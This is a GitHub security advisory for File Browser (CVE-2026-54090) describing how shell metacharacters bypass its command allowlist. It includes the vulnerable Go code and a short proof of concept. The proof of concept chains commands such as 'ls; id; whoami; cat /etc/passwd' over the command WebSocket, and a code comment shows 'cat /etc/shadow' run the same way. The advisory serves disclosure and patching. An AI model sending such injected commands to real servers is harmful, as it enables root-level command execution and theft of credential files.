# [H] File Browser has a Command Execution Allowlist Bypass via Shell Metacharacter Injection

## Summary
Severity: High
Advisory: GHSA-8c9q-7855-wfxq
CVE: CVE-2026-54090
CWE: CWE-184, CWE-77
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-8c9q-7855-wfxq
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.33.8

## Details
> [!NOTE]
> **This feature has been disabled by default for all installations from v2.33.8 onwards, including for existent installations**. To exploit this vulnerability, the instance administrator must turn on a feature and ignore all the warnings about known vulnerabilities. We're publishing this new advisory to make it clear that all vulnerabilities concerning this feature are disclosed.
>
> For more information about tracking vulnerability issues related to the Command Execution features, check https://github.com/filebrowser/filebrowser/issues/5199.

## Summary

When a shell interpreter is configured (e.g. `/bin/sh -c`), the command allowlist can be bypassed through shell metacharacters. The allowlist validates only the first token of user input, but the entire raw string is handed to the shell — semicolons, pipes, backticks, and `$()` all work to chain arbitrary commands after a permitted one.

This is a distinct issue from CVE-2025-52995 (regex partial matching, fixed in 2.33.10) and CVE-2025-52903 (GTFOBins-style subcommands). The `slices.Contains` fix does not prevent this bypass.

## Affected Location

- `runner/parser.go`, function `ParseCommand` (lines 10-25)
- `http/commands.go`, function `commandsHandler` (lines 72-86)

## Root Cause

`ParseCommand` extracts the first token via `SplitCommandAndArgs` for the allowlist check, then passes the entire raw input to the shell:

```go
func ParseCommand(s *settings.Settings, raw string) (command []string, name string, err error) {
    name, args, err := SplitCommandAndArgs(raw)
    if len(s.Shell) == 0 || s.Shell[0] == "" {
        command = append(command, name)
        command = append(command, args...)
    } else {
        command = append(command, s.Shell...)
        command = append(command, raw)   // full user input, metacharacters included
    }
    return command, name, nil
}
```

In `commandsHandler`:

```go
if !slices.Contains(d.user.Commands, name) {  // name = "ls", passes
    // reject
}
cmd := exec.Command(command[0], command[1:]...)
// actually executes: /bin/sh -c "ls; id; cat /etc/shadow"
```

`name` is `ls` — allowed. But `/bin/sh -c` interprets the rest.

## PoC

Prerequisites:
- Command execution enabled (`--disable-exec=false`)
- Shell configured to `/bin/sh -c`
- User has Execute permission with an allowlist, e.g. `git,ls,cat`

Steps:

1. Log in, grab a JWT:

```
POST /api/login
{"username":"admin","password":"..."}
```

2. Open a WebSocket to `/api/command/` with header `X-Auth: <jwt>`.

3. Send:

```
ls; id; whoami; cat /etc/passwd
```

4. All four commands execute and output is returned. Sending just `whoami` alone returns "Command not allowed." — the allowlist is active but bypassable.

Output:

```
bin
etc
home
...
===BYPASS===
uid=0(root) gid=0(root) groups=0(root),10(wheel)
root
root:x:0:0:root:/root:/bin/sh
```

Tested against commit `d236f1c` (frontend v3.0.0) on the official Docker image `filebrowser/filebrowser:latest`.

## Impact

Any user with Execute permission and at least one allowed command can run arbitrary OS commands at the privilege level of the server process. In the default container this is root.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-8c9q-7855-wfxq
- https://nvd.nist.gov/vuln/detail/CVE-2026-54090
- https://github.com/filebrowser/filebrowser/issues/5199
- https://github.com/filebrowser/filebrowser
